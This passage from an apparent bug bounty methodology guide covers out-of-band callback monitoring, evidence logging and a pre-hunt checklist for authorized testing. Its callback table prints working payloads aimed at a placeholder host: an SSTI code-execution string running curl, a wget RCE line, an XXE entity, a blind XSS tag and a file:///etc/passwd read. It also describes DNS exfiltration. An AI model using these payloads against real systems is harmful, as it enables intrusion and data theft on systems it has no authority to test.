Callbacks are how you detect blind vulnerabilities. Without proper monitoring, you'll miss SSRF, blind XSS, XXE, and race condition triggers.

### 9.1 HTTP Callbacks

```bash
# Option 1: Interactsh (recommended - self-hosted or cloud)
interactsh-client -v
# Returns: https://xyz12345.oast.fun
# Polling URL: https://xyz12345.oast.fun/poll
# Use this URL in SSRF, blind XSS, XXE payloads

# Interactsh with custom domain:
interactsh-client -v -d your-callback.com
# Requires DNS records configured

# Option 2: Burp Collaborator (built-in)
# Burp > Project Options > Misc > Collaborator Server
# "Generate Collaborator payload" → paste into requests
# "Poll Collaborator" → check for interactions

# Option 3: Webhook.site (simple, web-based)
# Open https://webhook.site
# Get unique URL: https://webhook.site/abc123-def456
# Keep page open - auto-updates with incoming requests

# Option 4: Custom callback server
# Python-based
python -m http.server 8888
# ngrok for public URL
ngrok http 8888
# ngrok URL: https://abc123.ngrok-free.app
```

**Callback payloads by vulnerability type:**

| Vulnerability | Payload | Monitoring Target |
|--------------|---------|------------------|
| SSRF | `http://your-interactsh-url/ssrf-test` | HTTP GET request |
| Blind XSS | `<img src=http://your-interactsh-url/xss> ` | HTTP GET with Referer |
| XXE | `<!ENTITY xxe SYSTEM "http://your-interactsh-url/xxe">` | HTTP GET from server |
| SSTI | `{{config.__class__.__init__.__globals__['os'].popen('curl http://your-interactsh-url/ssti')}}` | HTTP GET from server |
| File read via SSRF | `file:///etc/passwd` | HTTP GET or no response |
| RCE payloads | `wget http://your-interactsh-url/rce` | HTTP GET from server |
| Open redirect | `?url=http://your-interactsh-url/redirect` | HTTP GET with specific path |

### 9.2 DNS Callbacks

Some WAFs and proxies block HTTP callbacks but allow DNS queries. DNS callbacks are also useful for detecting SSRF in network-level features.

```bash
# Interactsh automatically provides DNS callbacks
# Payload: xyz12345.oast.fun
# This resolves via DNS — the DNS query itself is recorded

# Custom DNS callback server
# Set up NS record for dns.yourdomain.com pointing to your server
# Run a DNS listener:
sudo tcpdump -i eth0 port 53 | grep "yourdomain.com"

# Burp Collaborator also provides DNS callbacks
# (Same as HTTP — Collaborator handles both)
```

**DNS callback use cases:**

```
1. SSRF via DNS rebinding: 
   Payload: http://xyz12345.oast.fun/ssrf
   If HTTP is blocked, DNS lookup still triggers callback

2. SSRF via URL parser quirks:
   Payload: http://xyz12345@oast.fun/ssrf
   Some URL parsers interpret @ as username

3. DNS exfiltration (advanced):
   Payload: data.xyz12345.oast.fun
   Where "data" is exfiltrated content (limited to DNS label chars)
```

### 9.3 Email Monitoring

Some bugs require email interaction — password resets, account verification, email-based IDOR.

```bash
# Email monitoring strategies:

# 1. Gmail with labels
# Create a filter: to:hunter1+target@domain.com
# Apply label: "target.com"
# Check label for password reset links, verification codes

# 2. Custom domain catch-all
# All emails to *@hunting-domain.com arrive in one inbox
# Subject-line search for target name

# 3. Webhook-based email
# Use Mailgun/SendGrid forwarding
# Incoming email → HTTP POST to your webhook URL
# Parse the POST for reset tokens, verification links

# 4. Automated email parsing for password resets
import imaplib
import email
from email.header import decode_header

def check_password_reset(target, username, password):
    """Check for password reset emails from target."""
    mail = imaplib.IMAP4_SSL("imap.gmail.com")
    mail.login(username, password)
    mail.select("inbox")
    
    status, messages = mail.search(None, f'(FROM "{target}")')
    for msg_id in messages[0].split()[-5:]:  # Last 5 emails
        status, msg_data = mail.fetch(msg_id, "(RFC822)")
        raw_email = msg_data[0][1]
        msg = email.message_from_bytes(raw_email)
        
        if msg.is_multipart():
            for part in msg.walk():
                if part.get_content_type() == "text/html":
                    body = part.get_payload(decode=True).decode()
                    # Extract reset link from body
                    reset_link = extract_reset_link(body)
                    if reset_link:
                        return reset_link
    return None
```

### 9.4 Notification Setup (Slack/Discord Webhooks)

Real-time notifications let you know when a callback fires without watching the dashboard.

```bash
# Slack webhook notification for callbacks
function Send-SlackAlert {
    param($Message, $WebhookUrl)
    
    $body = @{
        text = $Message
        username = "CallbackBot"
        icon_emoji = ":warning:"
    } | ConvertTo-Json
    
    curl -s -X POST -H "Content-Type: application/json" -d $body $WebhookUrl
}

# Discord webhook (similar)
function Send-DiscordAlert {
    param($Message, $WebhookUrl)
    
    $body = @{
        content = $Message
        username = "CallbackBot"
    } | ConvertTo-Json
    
    curl -s -X POST -H "Content-Type: application/json" -d $body $WebhookUrl
}

# Integrate with interactsh webhook
# interactsh-client -v -webhook-url https://hooks.slack.com/services/xxx/yyy/zzz
```

**What to alert on:**

- HTTP GET from target IP range (SSRF confirmed)
- DNS query from target IP range (SSRF via blocked protocol)
- Blind XSS callback (XSS confirmed, cookie exfiltration possible)
- Multiple callbacks from same payload (mass exploitation)
- Callback contains specific paths in URL (/etc/passwd, /admin)

---

## Reproducibility Foundations

Every finding must be reproducible. If you can't reproduce it, you can't report it. These patterns ensure every finding is captured in a repeatable way.

### 10.1 Session Recording

```bash
# Burp Logger++ output
# Configure Logger++ to log all in-scope requests/responses
# Format: CSV with full request/response
# Save to: ./logs/{target}_{date}.csv

# Request logging with curl's --trace
curl --trace trace.txt -H "Authorization: Bearer $token" https://target.com/api/users

# PowerShell transcript (captures everything)
Start-Transcript -Path "./logs/session_$(Get-Date -Format yyyyMMdd_HHmmss).txt"
# ... do hunting ...
Stop-Transcript
```

**Logger++ configuration for reproducibility:**

```
View > Logger++ > Settings
  Log Level: All in-scope items
  Log to file: Yes
  File path: ./logs/target_2026-06-16.csv
  Include: Method, URL, Status, Request, Response, Time, Comment
  Auto-save interval: Every 50 items

Each finding gets a Comment with:
  - FINDING-001
  - Brief description
  - Severity estimate
  - Account used
```

### 10.2 Request Logging

Every finding needs a reproducible request/response pair. Store them as curl commands.

```bash
# Burp: Right-click request > Copy as curl command
# Saves the exact request that triggered the finding

# Manual curl capture
$finding = @"
# Finding: IDOR in document access
# Account: Account A (low priv)
# Target: https://api.target.com/v2/documents/789
# Date: 2026-06-16 14:32:00 UTC
curl -s -X GET 'https://api.target.com/v2/documents/789' \
  -H 'Authorization: Bearer eyJhbG...' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)' \
  -H 'Accept: application/json' | jq .
"@

# Store in finding-specific directory
New-Item -ItemType Directory -Path "./findings/FINDING-001" -Force
Set-Content -Path "./findings/FINDING-001/request.txt" -Value $finding
```

**Curl command storage template:**

```bash
# For each finding, store:
# 1. request.sh — curl command that reproduces the finding
# 2. response.json — response body
# 3. headers.txt — response headers  
# 4. notes.md — context, impact, reproduction steps
# 5. poc.png — screenshot (if applicable)

./findings/
  FINDING-001/
    request.sh
    response.json
    headers.txt
    notes.md
    poc.png
  FINDING-002/
    request.sh
    response.json
    headers.txt
    notes.md
```

### 10.3 Environment Documentation

Document your environment so you (or someone else) can reproduce the setup later.

```yaml
# environment.yaml
hunting_session:
  target: target.com
  date: 2026-06-16
  duration: 4 hours (14:00 - 18:00 UTC)
  
network:
  primary_ip: 192.0.2.100
  proxy_chain: [us-proxy:8080, eu-proxy:8080]
  dns: 1.1.1.1 (Cloudflare)
  
accounts:
  account_a: free user, created 2026-06-10
  account_b: free user alt, created 2026-06-12
  account_c: premium (trial), expires 2026-06-20
  
tools:
  burp: Professional v2025.12
  ffuf: v2.1.0
  httpx: v1.3.9
  nuclei: v3.2.0
  interactsh: v1.1.0
  
wordlists:
  primary: SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
  custom: ./wordlists/target_endpoints.txt (1,247 entries)
  params: ./wordlists/target_params.txt (340 entries)
  
callbacks:
  http: https://xyz12345.oast.fun
  dns: xyz12345.oast.fun
  
notes:
  - Cloudflare WAF detected — rate limiting at 30 req/min
  - Rails 7.0 backend — test mass assignment aggressively
  - Previous IDOR findings in invoice endpoints
```

### 10.4 Timestamp Discipline

Timestamp discipline means every request is logged with a timestamp that can be correlated with callback events.

```bash
# Include timestamps in all logs
function Log-Event {
    param($Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff UTC"
    $logLine = "[$timestamp] $Message"
    Add-Content -Path "./logs/events.log" -Value $logLine
    Write-Host $logLine
}

# Log every significant event
Log-Event "Starting session for target.com"
Log-Event "Testing IDOR on /api/v2/documents/{id}"
Log-Event "Sending SSRF payload to PDF generator endpoint"
Log-Event "[SSRF] Callback received from 203.0.113.5 at interactsh"
Log-Event "Finding confirmed: SSRF in PDF generator"
Log-Event "Stopping session — 3 findings: 1 P1, 2 P2"
```

**Callback correlation process:**

```
1. Send payload with unique identifier (UUID in URL path)
   curl -s "https://target.com/render?url=http://UNIQUE_ID.interactsh/ssrf"

2. Note the timestamp: 14:32:15.000 UTC

3. When callback arrives at interactsh at 14:32:18.500 UTC
   It contains: UNIQUE_ID in the URL path
   
4. Match UNIQUE_ID to your log entry
   [14:32:15] [SSRF-TEST] Sent SSRF payload with ID=UNIQUE_ID
   
5. Proof is:
   - Request log shows the payload (with UNIQUE_ID)
   - Callback log shows the same UNIQUE_ID
   - 3.5 second gap = server-side processing time
```

---

## Pre-Hunt Readiness Checklist

Run through this checklist before EVERY hunting session. Check off every item. If any item is not ready, fix it before starting.

### Accounts & Authentication

- [ ] Account A (free/regular) — logged in, session active, token valid
- [ ] Account B (free/regular alt) — logged in, session active, token valid
- [ ] Account C (premium/subscribed) — logged in, session active, token valid
- [ ] Account D (admin) — logged in or escalation path identified
- [ ] All API keys generated and working
- [ ] All cookies/tokens stored in Burp cookie jar
- [ ] Session refresh configured (auto-refresh on 401)
- [ ] Premium trials not expired (set reminders if close)
- [ ] Account geolocation matches proxy region (don't mismatch)

### Network & Proxies

- [ ] Primary proxy working (test via curl to api.ipify.org)
- [ ] Secondary proxy working (different region)
- [ ] Proxy rotation configured (if using rotating proxies)
- [ ] DNS not leaking (test via ipleak.net)
- [ ] Burp upstream proxy configured correctly
- [ ] Rate limiting configured per-target
- [ ] No conflicting system proxy settings
- [ ] VPN off (unless intentional — double proxy = issues)

### Burp Suite

- [ ] Project file loaded for this target
- [ ] Scope configured (include/exclude correct)
- [ ] Scope highlighted in Proxy/Repeater
- [ ] Session handling rules active for all accounts
- [ ] Cookie jar populated for all accounts
- [ ] All extensions loaded (Logger++, Autorize, Param Miner, etc.)
- [ ] Proxy listener running (127.0.0.1:8080)
- [ ] TLS certificate installed in browser
- [ ] Logger++ logging all in-scope items
- [ ] Repeater tabs cleaned from last session
- [ ] Collaborator client configured
- [ ] Intruder resource pools configured

### Wordlists & Payloads

- [ ] General wordlists accessible (SecLists)
- [ ] Custom endpoint wordlist built (from JS bundles, historical data)
- [ ] Custom parameter wordlist built
- [ ] Tech-specific wordlist selected (based on fingerprinting)
- [ ] Payload files accessible (XSS, SQLi, SSRF, SSTI)
- [ ] Bypass tables loaded (SSRF IP bypass, file upload bypass)
- [ ] All wordlists non-empty (check file sizes)

### Callbacks & Monitoring

- [ ] Interactsh client running (or Collaborator configured)
- [ ] Callback URL/domain noted in template
- [ ] Webhook.site open for manual callback checks
- [ ] Notification webhooks configured (Slack/Discord)
- [ ] Email monitoring set up (reset links, verification codes)
- [ ] DNS callback configured (for SSRF that bypasses HTTP)
- [ ] Callback URLs included in payload templates

### Scope & Prior Art

- [ ] Program rules re-read (in-scope/out-of-scope confirmed)
- [ ] Rate limits confirmed (if specified in rules)
- [ ] Testing hours confirmed (some programs restrict hours)
- [ ] Prior-art search complete (disclosed reports, write-ups)
- [ ] Duplicate database checked
- [ ] Out-of-scope targets documented (don't touch)
- [ ] Sensitive actions documented (delete, mass email, etc. — don't do)

### Environment

- [ ] Python venv activated (if using Python tools)
- [ ] Node version correct (nvm use lts)
- [ ] Go tools in PATH ($GOPATH/bin)
- [ ] Docker containers running (if using containers)
- [ ] Tool versions verified (no outdated tools)
- [ ] Output directories created (logs, findings, screenshots)
- [ ] Logging configured (session transcript, request logs)
- [ ] Timestamp service running (or clocks synced)

### Finding Capture Ready

- [ ] Findings directory created for this target
- [ ] Finding template ready
- [ ] Screenshot tool ready (Greenshot, ShareX, Snipaste)
- [ ] curl command capture method ready
- [ ] HAR export configured (if needed)
- [ ] Evidence hygiene notes reviewed (cookie redaction, PII masking)
- [ ] Report template reviewed (HackerOne/Bugcrowd/Immunefi formats)

### Final Pre-Flight

- [ ] Quick smoke test: send one request, verify it appears in Burp
- [ ] Quick smoke test: verify callback server receives test ping
- [ ] Quick smoke test: verify proxy chain (IP shows proxy location)
- [ ] Quick smoke test: all accounts can access the target
- [ ] Timer set (hunting session duration, e.g., 4 hours)
- [ ] Break schedule noted (every 45 min, 5 min break)
- [ ] Emergency stop condition noted (if things go wrong, shut down)
- [ ] **Ready to hunt** ✅

### Pre-Hunt Quick-Start Script

```bash
# One command to set everything up
function Start-HuntingSession {
    param($TargetName)
    
    Write-Host "Starting hunting session for $TargetName..."
    
    # 1. Verify accounts
    # (Call account verification script)
    
    # 2. Test proxy
    $proxyIP = (curl -s --proxy http://us-proxy:8080 https://api.ipify.org).Content
    Write-Host "Proxy IP: $proxyIP"
    
    # 3. Start logging
    Start-Transcript -Path "./logs/$TargetName/$(Get-Date -Format yyyyMMdd_HHmmss).txt"
    
    # 4. Verify callback
    $callbackResp = curl -s "https://xyz12345.oast.fun/poll"
    Write-Host "Callbacks: $(($callbackResp | ConvertFrom-Json).length) pending"
    
    # 5. Smoke test
    $smokeTest = curl -s -o /dev/null -w "%{http_code}" "https://$TargetName"
    Write-Host "Target status: $smokeTest"
    
    Write-Host "Session ready. Good hunting!"
}

Start-HuntingSession "target.com"
```

---

## References

- [SecLists Wordlists](https://github.com/danielmiessler/SecLists) — Comprehensive wordlist collection
- [ProjectDiscovery Tools](https://github.com/projectdiscovery) — Subfinder, httpx, nuclei, naabu, dnsx, katana, interactsh
- [FFUF](https://github.com/ffuf/ffuf) — Fast web fuzzer
- [Burp Suite Documentation](https://portswigger.net/burp/documentation) — Session handling, scope, extensions
- [Webhook.site](https://webhook.site) — HTTP callback inspection
- [Interactsh](https://github.com/projectdiscovery/interactsh) — Out-of-band interaction server
- [OWASP WAF Bypass](https://owasp.org/www-community/incidents/WAF_Evasion) — WAF bypass techniques
- [See also: Part 4 — Finding Validation](validation.md)
- [See also: Part 6 — WAF Bypass](waf-bypass.md)
- [`agents/recon-agent.md`](agents/recon-agent.md) — Automated recon execution
- [`agents/scope-enforcer.md`](agents/scope-enforcer.md) — Scope boundary enforcement
- [`skills/web2-recon/SKILL.md`](skills/web2-recon/SKILL.md) — Web2 recon pipeline
